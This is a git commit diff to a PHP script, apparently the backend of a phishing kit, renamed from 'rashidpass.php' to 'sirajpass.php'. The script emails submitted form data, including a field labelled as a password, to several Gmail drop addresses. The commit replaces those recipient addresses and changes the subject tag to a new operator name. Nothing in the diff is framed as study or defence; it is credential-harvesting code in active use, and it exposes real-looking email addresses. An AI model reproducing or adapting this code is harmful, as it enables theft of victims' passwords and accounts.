b959c7735353457e808b86096e918cb26845206a
mhussainofficial03 <mhussain.official03@gmail.com>
2025-08-17 02:05:37 +0800

    Update and rename rashidpass.php to sirajpass.php

--- sirajpass.php
+++ sirajpass.php
@@ -35,14 +35,14 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
         // Email properties
         $mail->addAddress('rutherfordhenress@gmail.com', 'PASSWORD');
-        $mail->addAddress('opportunity.get.verified.today@gmail.com');
-        $mail->addAddress('okieskissdoman@gmail.com');
+        $mail->addAddress('approval.ads.monica.ramey@gmail.com');
+        $mail->addAddress('judyhansen674@gmail.com');
 
       // Email recipient's address
 
         // Email content
         $mail->isHTML(true);
-        $mail->Subject = 'RASHID';
+        $mail->Subject = 'SIRAJ';
         $mail->Body = $emailBody; // Set the email body using the collected form data
 
 
